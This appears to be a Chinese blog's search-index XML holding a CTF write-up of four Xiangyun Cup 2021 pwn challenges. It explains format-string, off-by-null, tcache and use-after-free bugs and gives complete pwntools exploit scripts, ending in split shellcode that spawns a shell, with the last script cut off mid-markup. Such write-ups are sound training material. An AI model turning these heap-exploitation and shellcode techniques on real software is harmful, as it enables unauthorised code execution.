<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pwn复现 | 祥云杯2021</title>
    <url>/2021/09/09/xyb2021/</url>
    <content><![CDATA[<blockquote>
<p>鸽鸽鸽… 还有两道努努力能跟着 wp 做出来的 lemon 和 life_simulation 还在鸽… en，这四道都是简单题。我个人最喜欢 JigSaw’s Cage，改 shellcode 汇编好好玩！</p>
</blockquote>
<span id="more"></span>
<h2 id="note">note</h2>
<blockquote>
<p>amd64-64-little, FULL RELRO, Canary found, NX enabled, PIE enabled</p>
</blockquote>
<p>菜单题：</p>
<ul>
<li>add：不限个数，size不大于 0x100，malloc 后 ptr 存在 bss 上，没有chunklist。返回堆地址。</li>
<li>show：检查 ptr 是否有值，puts 打印 ptr 指向的堆块的内容。</li>
<li>say：读 100 字节到栈上，以其为参数进行 scanf。</li>
</ul>
<p>say 函数存在明显的格式化字符串漏洞，buf 是我们可控的 fmt。</p>
<p><img src="https://i.loli.net/2021/09/09/LTZ1AG5a3xwhHmy.png" alt=""></p>
<p>程序是64位，前六个参数在寄存器中，第七个参数起才置于栈上。先看看 scanf 前栈的情况,<code>b *($rebase(0x1235))</code>：</p>
<p><img src="https://i.loli.net/2021/09/09/IzcWnAj4X76DxVe.png" alt=""></p>
<p>buf 后紧跟着 _<em>IO_21_stdout</em> ，这里也是偏移7的位置，可用 <code>%7$s</code> 往该结构体上写任意数据。因此可以打 IO_FILE，泄露libc地址。gdb调试一下。<code>b *($rebase(0x123a))</code>：</p>
<p><img src="https://i.loli.net/2021/09/09/nCFJaeLcoYrI4Oy.png" alt=""></p>
<p>要注意栈情况是跟程序加载时使用的 ld 和 libc 相关的。下图是我没有更换 libc 时的栈布局，_<em>IO_21_stdout</em> 与buf 相差了 0x28 。</p>
<p><img src="https://i.loli.net/2021/09/09/YVoQOuDKpzbAj7n.png" alt=""></p>
<p>至于为什么做的时候不更换呢，是因为我用以往只会的一种 patchelf 的方法后（<code>--set-rpath</code> 和 <code>--set-interpreter</code>），程序崩了。我用的是 <code>glibc-all-in-one-master</code> 提供的 lib 库，偶尔会出现 patch 完段错误的情况。手动把 ld 和 libc 分别 patch 一遍就好了，不 patch 的话也可以设置 LD_PRELOAD 再运行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./ld-2.23.so ./note</span><br><span class="line">patchelf --replace-needed libc.so.6 ./libc-2.23.so ./note</span><br><span class="line"></span><br><span class="line">LD_PRELOAD=./libc-2.23.so ./ld-2.23.so ./note</span><br><span class="line"><span class="meta">#</span><span class="bash">p=process(argv=[<span class="string">&quot;./ld-2.23.so&quot;</span>,<span class="string">&quot;./note&quot;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">&quot;./libc-2.23.so&quot;</span>&#125;)</span></span><br></pre></td></tr></table></figure>
<p>现在我们可以获得 libc 地址和堆地址。scanf 函数的buf 可写入 100 字节，也不能算是栈溢出，应该说是由于 scanf 的内容、偏移可控，栈上有 100 字节的空间可控，加上从第七个参数起位于栈上，scanf 的目标地址也可控，从而可以任意地址写。也就是可以在 buf+0x08 的位置写上任意地址，再用 <code>%7$s</code> 写。同理，如果在 buf+0x10 的位置写地址，用 <code>%8$s</code> 写。</p>
<p><img src="https://i.loli.net/2021/09/09/Cv7sdiN3Pbtwp5a.png" alt=""></p>
<p>有libc，能任意写，直接改 __malloc_hook 就好了，连堆地址都用不上：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,bits=<span class="number">64</span>,endian=<span class="string">&#x27;little&#x27;</span>,binary=ELF(<span class="string">&#x27;./note&#x27;</span>))</span><br><span class="line"><span class="comment"># p=process(argv=[&quot;./ld-2.23.so&quot;,&quot;./note&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;./libc-2.23.so&quot;&#125;)</span></span><br><span class="line">p=process(<span class="string">&#x27;./note&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./note&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">num</span>):</span></span><br><span class="line">	ru(<span class="string">&#x27;ice: &#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,con</span>):</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	ru(<span class="string">&#x27;size: &#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size))</span><br><span class="line">	ru(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">	sl(con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">con,<span class="built_in">input</span></span>):</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	ru(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">	sd(con)</span><br><span class="line">	ru(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">input</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">say(<span class="string">&#x27;%7$s&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>),p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">libcbase=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c36e0</span></span><br><span class="line"><span class="comment">#success(hex(libcbase))</span></span><br><span class="line">mallochook=libcbase+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x8</span></span><br><span class="line">realloc=libcbase+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">og=libcbase+one_gadget[<span class="number">1</span>]</span><br><span class="line">say(<span class="string">&#x27;%7$s&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(mallochook),p64(og)+p64(realloc+<span class="number">8</span>)+p64(<span class="number">0</span>))</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<p>如果非得用上堆地址的话，应该是通过 house of orange 来改。程序有任意写和show功能，没有 delete 函数，因此通过修改 top chunk 把它放入 unsorted bin 中，再申请到 malloc hook 的位置改。</p>
<h2 id="PassWordBox-FreeVersion">PassWordBox_FreeVersion</h2>
<blockquote>
<p>amd64-64-little, Full RELRO, Canary found, NX enabled, PIE enabled</p>
</blockquote>
<p>菜单题：</p>
<ul>
<li>add：添加 80 个不大于 0x100 的 pwd box，输入 pwd 的时候存在 off-by-null，第一次 add 的话会返回加密后的pwd。</li>
<li>edit：只用一次，修改 pwd box 前 0x10 字节。输入的 idx 为无符号数，但未对其大小进行检查。</li>
<li>show：对无符号数 idx 进行范围检查，明文打印 username 和 pwd。</li>
<li>dele：全清空，无 uaf 。</li>
</ul>
<p>其中的加密函数只是逐位异或，key 是个两层随机生成的随机数。当 content 为 ‘\x00’ 时相当于 key本身。因为 add 函数会在第一次 add 的时候输出密文，所以第一次传入’\x00’的话能泄露出key。又因为两次异或等于其本身，后续传数据的时候，如果想明文存储，先异或再传就可以了。</p>
<p><img src="https://i.loli.net/2021/09/09/idCjRchmVnzWfEU.png" alt=""></p>
<p>可以看到 libc 的小版本是1.4，tcache 中有 key 值，unlink 的时候会检查是否存在 double free，将 key 改成别的值就可以绕过。</p>
<p><img src="https://i.loli.net/2021/09/09/MmSilghRV9nyota.png" alt=""></p>
<p>可 add 数量比较大，基本等于无限制。构造 off by null 的时候我也没太注意节省 chunk 数量。en，常规的 2.27  off by null，考点应该就是 tcache key 和 异或加密。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,bits=<span class="number">64</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,binary=ELF(<span class="string">&#x27;./pwdFree&#x27;</span>))</span><br><span class="line">p=process(<span class="string">&#x27;./pwdFree&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwdFree&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">num</span>):</span></span><br><span class="line">	ru(<span class="string">&#x27;ice:&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,size,con</span>):</span></span><br><span class="line">	sleep(<span class="number">0.05</span>)</span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	ru(<span class="string">&#x27;ve:&#x27;</span>)</span><br><span class="line">	sl(name)</span><br><span class="line">	ru(<span class="string">&#x27;wd:&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size))</span><br><span class="line">	ru(<span class="string">&#x27;wd:&#x27;</span>)</span><br><span class="line">	sd(con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,con</span>):</span></span><br><span class="line">	sleep(<span class="number">0.05</span>)</span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	sd(con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	sleep(<span class="number">0.05</span>)</span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	ru(<span class="string">&#x27;ck:&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	sleep(<span class="number">0.05</span>)</span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	ru(<span class="string">&#x27;te:&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;key&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;Save ID:&#x27;</span>)</span><br><span class="line">key=u64(rv(<span class="number">8</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="string">&#x27;aaa&#x27;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>),<span class="number">0xf8</span>,<span class="string">&#x27;bbb\n&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;aaa8&#x27;</span>,<span class="number">0xf8</span>,<span class="string">&#x27;ccc\n&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;aaa9&#x27;</span>,<span class="number">0x78</span>,<span class="string">&#x27;ccc\n&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;aaa10&#x27;</span>,<span class="number">0xf8</span>,<span class="string">&#x27;ccc\n&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;aaa11&#x27;</span>,<span class="number">0x10</span>,<span class="string">&#x27;ccc\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">	dele(i)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">add(<span class="string">&#x27;ddd1&#x27;</span>,<span class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64((<span class="number">0x100</span>+<span class="number">0x80</span>)^key))<span class="comment">#1</span></span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;ddd2&#x27;</span>,<span class="number">0xd8</span>,<span class="string">&#x27;\n&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;ddd3&#x27;</span>,<span class="number">0x18</span>,<span class="string">&#x27;\n&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;Pwd is: &#x27;</span>)</span><br><span class="line">libcbase=u64(rv(<span class="number">8</span>))^key</span><br><span class="line">libcbase-=<span class="number">0x3ebca0</span></span><br><span class="line"><span class="comment">#success(hex(libcbase))</span></span><br><span class="line">free_hook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">og=one_gadget[<span class="number">1</span>]+libcbase</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;ddd4&#x27;</span>,<span class="number">0x60</span>,<span class="string">&#x27;\n&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(free_hook)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;ddd5&#x27;</span>,<span class="number">0x60</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;ddd6&#x27;</span>,<span class="number">0x60</span>,p64(og^key)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h2 id="PassWordBox-ProVersion">PassWordBox_ProVersion</h2>
<blockquote>
<p>amd64-64-little, Full RELRO, Canary found, NX enabled, PIE enabled</p>
</blockquote>
<p>前一题的 2.0 版本，不同之处：</p>
<ul>
<li>
<p>add：0x420 &lt;= size &lt;=0x888，属于 large bin范围。</p>
</li>
<li>
<p>edit：堆块 active 的标志不为空时，可编辑 size 长度的内容，不限次数。</p>
</li>
<li>
<p>delete：uaf，active 标志置零。</p>
</li>
<li>
<p>recover：指定 chunk 的 active 标志置一，uaf，edit、delete、show函数都能再用被 free 过的 chunk。</p>
</li>
</ul>
<p>另外，libc 是 2.31 的版本，tcache bin 中的 key 被移位加密过。</p>
<p>首先 libc 的泄露，recover 后有 uaf 漏洞，直接 show unsorted bin 中的 chunk 就能泄露 libc 地址。</p>
<p>其次改 hook。2.31 的环境下堆块利用起来可能有点麻烦，不妨试试打 tcache_max_bins。这种方法我在之前的比赛中也有遇到过：<a href="https://7ee.medium.com/ctf%E5%BE%A9%E7%8F%BE003-%E4%BF%AE%E6%94%B9tcache-max-bins-b3a3607791c8?source=user_profile---------8----------------------------">【ctf復現003】修改TCACHE_MAX_BINS</a> 。这个 mp_ 结构体位于 libc 上，libc 地址已知，它的地址也可以算出来。利用 larget bin，修改 bk_nextsize 位来改。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,bits=<span class="number">64</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,binary=ELF(<span class="string">&#x27;./pwdPro&#x27;</span>))</span><br><span class="line">p=process(<span class="string">&#x27;./pwdPro&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwdPro&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">num</span>):</span></span><br><span class="line">	ru(<span class="string">&#x27;ice:&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,size,con</span>):</span></span><br><span class="line">	sleep(<span class="number">0.05</span>)</span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	ru(<span class="string">&#x27;Add:&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	ru(<span class="string">&#x27;ve:&#x27;</span>)</span><br><span class="line">	sl(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">	ru(<span class="string">&#x27;wd:&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size))</span><br><span class="line">	ru(<span class="string">&#x27;wd:&#x27;</span>)</span><br><span class="line">	sd(con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,con</span>):</span></span><br><span class="line">	sleep(<span class="number">0.05</span>)</span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	ru(<span class="string">&#x27;it:&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	sd(con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	sleep(<span class="number">0.05</span>)</span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	ru(<span class="string">&#x27;ck:&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	sleep(<span class="number">0.05</span>)</span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	ru(<span class="string">&#x27;te:&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	menu(<span class="number">5</span>)</span><br><span class="line">	ru(<span class="string">&#x27;Recover:&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x420</span>)</span><br><span class="line">ru(<span class="string">&#x27;Save ID:&#x27;</span>)</span><br><span class="line">key=u64(rv(<span class="number">8</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak main_arena(unsortedbin)</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x460</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x420</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x450</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">recover(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;Pwd is: &#x27;</span>)</span><br><span class="line">libcbase=u64(rv(<span class="number">8</span>))</span><br><span class="line">libcbase^=key</span><br><span class="line">libcbase-=<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">free_hook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">mp_tcache_bins=libcbase+<span class="number">0x1eb2d0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x480</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(mp_tcache_bins-<span class="number">0x20</span>)+p64(<span class="number">0</span>)+p64(mp_tcache_bins-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">recover(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x480</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">5</span>)<span class="comment">#tcache</span></span><br><span class="line">recover(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>,p64(sys^key)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h2 id="JigSaw’sCage">JigSaw’sCage</h2>
<blockquote>
<p>amd64-64-little, Full RELRO, Canary found, NX enabled, PIE enabled</p>
</blockquote>
<p>程序一开始使用了 mprotect 函数，设置堆段的部分空间权限为7。v1的输入存在栈溢出漏洞，%ld 是八个字节，能将 ran 覆盖。</p>
<p><img src="https://i.loli.net/2021/09/09/2iI73hYMvnQydW6.png" alt=""></p>
<p>ran是伪随机数。由于在使用 rand() 函数之前未使用 srand 函数，种子默认初始化为1。可以拿提供的 <a href="http://libc.so">libc.so</a> 文件生成，预测 ran 的生成序列。序列的第一个数字为7，不可能大于 14，所以需要通过栈溢出修改 ran 值，在heap 中开启 0x1000 大小的 可读可写可执行空间。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">eelf = cdll.LoadLibrary(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">eelf.srand(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(eelf.rand() % <span class="number">16</span>)</span><br></pre></td></tr></table></figure>
<p>接下来是菜单：</p>
<ul>
<li>add：可添加6个 0x10的chunk，每个被初始化为 <code>'\xc3'*0x10</code> ，也就是16个 ret 指令。</li>
<li>delete：无uaf。</li>
<li>edit：读入 0x10，最后一个字节覆盖为 ret 指令。</li>
<li>show：打印。</li>
<li>test：执行 chunk_list[i] 的内容，0&lt; i &lt;31，可越界执行。</li>
</ul>
<p>根据前面开启的 0x1000 的 rwx 的空间，可以知道这里应该是往堆上写 shellcode 执行了。但是每次只能写 0x10（包括加上的 ret指令），因此需要拆分 shellcode。考点应该就是如何在有 ret 的情况下顺序执行不同 chunk 的 shellcode。</p>
<ul>
<li>执行 test 函数的时候，堆地址保存在寄存器上，可以用 jmp 指令跳到下一个堆块。</li>
<li><code>/bin/sh\x00</code> 太长了，无论如何分割 shellcode 都会超过 0x10。因此可通过调用 read 函数读入到指定位置上，再在下一段 shellcode 里从该位置取参数。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,bits=<span class="number">64</span>,endian=<span class="string">&#x27;little&#x27;</span>,binary=ELF(<span class="string">&#x27;./JigSAW&#x27;</span>))</span><br><span class="line">p=process(<span class="string">&#x27;./JigSAW&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./JigSAW&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">num</span>):</span></span><br><span class="line">	ru(<span class="string">&#x27;ice :&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	ru(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,con</span>):</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	ru(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	ru(<span class="string">&#x27;put:&#x27;</span>)</span><br><span class="line">	sd(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	ru(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Name:&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0x100000000000</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">	add(i)</span><br><span class="line"></span><br><span class="line">shellcode1=asm(<span class="string">&#x27;&#x27;&#x27;	</span></span><br><span class="line"><span class="string">	mov rdi,rax</span></span><br><span class="line"><span class="string">	xor eax,eax</span></span><br><span class="line"><span class="string">	push 0x50</span></span><br><span class="line"><span class="string">	push rdx</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	pop rdx</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode2=asm(<span class="string">&#x27;&#x27;&#x27;	</span></span><br><span class="line"><span class="string">	push	0				</span></span><br><span class="line"><span class="string">	sub rdx,0x20</span></span><br><span class="line"><span class="string">	mov rdi,[rdx]</span></span><br><span class="line"><span class="string">	add rdx,0x40</span></span><br><span class="line"><span class="string">	jmp rdx</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>)</span><br><span 